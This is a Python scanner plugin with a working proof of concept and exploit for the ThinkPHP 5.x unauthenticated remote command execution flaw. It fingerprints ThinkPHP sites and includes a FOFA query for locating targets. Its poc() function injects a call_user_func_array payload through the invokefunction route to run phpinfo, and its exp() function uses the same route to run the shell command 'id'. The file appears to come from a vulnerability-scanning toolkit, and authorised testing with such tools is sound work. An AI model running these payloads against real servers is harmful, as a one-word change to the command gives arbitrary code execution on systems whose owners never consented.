from lib.utils.useragent import chrome
import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": "ThinkPHP 5.x远程命令执行漏洞",
        "description": "ThinkPHP 5.x远程命令执行漏洞",
        "severity": "critical",
        "references": [
            "https://github.com/vulhub/vulhub/tree/master/thinkphp/5-rce"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": 0,
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "fofa-query": '''app="ThinkPHP''',
            "vuln-target": ""
        },
        "tags": ["thinkphp5", "rce", "unauth"],
    }

# vender fingerprint
def fingerprint(url):
    resp = requests.get(url, headers={'User-Agent': chrome() }, timeout=3, verify=False, allow_redirects=False)
    if " ThinkPHP V5" in resp.text and "https://e.topthink.com/Public/static/client.js" in resp.text:
        return True
    else:
        return False

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)
        payload = '/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1'
        target = url + payload
        
        resp = requests.get(target, headers={'User-Agent': chrome() }, timeout=3, verify=False, allow_redirects=False)

        if resp.status_code==200 and "PHP Extension" in resp.text and "PHP Version" in resp.text and "ThinkPHP" in resp.text:
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+payload
    except:
        result["success"] = False

    return result

# Exploit, can be same with poc()
def exp(url):
    result = {}
    try:
        url = format_url(url)
        cmd = "id"
        payload = '/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=' + cmd
        
        target = url + payload
        
        resp = requests.get(target, headers={'User-Agent': chrome() }, timeout=3, verify=False, allow_redirects=False)
        resp.raise_for_status()

        if "uid=" in resp.text and "gid=" in resp.text:
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+payload
    except:
        result["success"] = False

    return result

# utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url
